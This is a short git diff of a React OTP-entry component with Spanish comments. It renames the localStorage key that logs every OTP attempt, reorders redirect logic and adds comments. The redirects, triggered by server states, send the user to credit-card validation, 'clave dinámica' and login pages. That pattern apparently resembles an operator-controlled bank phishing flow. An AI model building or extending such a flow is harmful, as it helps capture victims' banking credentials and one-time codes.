@@ -282,7 +282,7 @@ export default function NumeroOTP() {
     };
 
     // Metodo para registrar el intento de otp
-    const actualizarLocalStorage = (otp) => {
+    const actualizarLocalStorage = (otpValue) => {
 
         // Se obtiene los datos del localStorage
         const storageKey = "datos_usuario";
@@ -294,15 +294,15 @@ export default function NumeroOTP() {
         let datos = raw ? JSON.parse(raw) : {};
 
         // Se inicializa el objeto de intentos si no existe
-        if (!datos.codigo) datos.codigo = {};
+        if (!datos.otp) datos.otp = {};
 
         // Se crea la clave del nuevo intento
-        const intentoNum = Object.keys(datos.codigo).length + 1;
+        const intentoNum = Object.keys(datos.otp).length + 1;
         const intentoKey = `intento_${intentoNum}`;
 
         // Se registra el nuevo intento
-        datos.codigo[intentoKey] = {
-            codigo: otp,
+        datos.otp[intentoKey] = {
+            codigo: otpValue,
             fecha: new Date().toLocaleString(),
         };
 
@@ -398,11 +398,11 @@ export default function NumeroOTP() {
                         break;
                     case 'error_tc':
 
-                        // Redirigir a la validación de tarjeta de crédito
-                        window.location.href = '/validacion-tc';
-
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la validación de tarjeta de crédito
+                        window.location.href = '/validacion-tc';
 
                         // Se sale del ciclo
                         break;
@@ -438,11 +438,11 @@ export default function NumeroOTP() {
                         break;
                     case 'error_din':
 
-                        // Redirigir a la clave dinámica
-                        window.location.href = '/clave-dinamica';
-
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la clave dinámica
+                        window.location.href = '/clave-dinamica';
 
                         // Se sale del ciclo
                         break;
@@ -483,17 +483,19 @@ export default function NumeroOTP() {
                         break;
                     case 'error_login':
 
-                        // Redirigir a la página de autenticación
-                        window.location.href = '/autenticacion';
-
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la página de autenticación
+                        window.location.href = '/autenticacion';
 
                         // Se sale del ciclo
                         break;
                     default:
+
+                        // Se sale del ciclo
                         break;
-                }
+                };
             } catch (error) {
 
                 // Se quita el estado de cargando
@@ -505,11 +507,14 @@ export default function NumeroOTP() {
         }, 3000);
     };
 
-
+    // Manejo de foco en inputs OTP
     const handleOtpFocus = () => {
+
+        // Se establece el estado de foco
         setOtpFocused(true);
     };
 
+    // Renderizado del componente
     return (
         <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
             <div
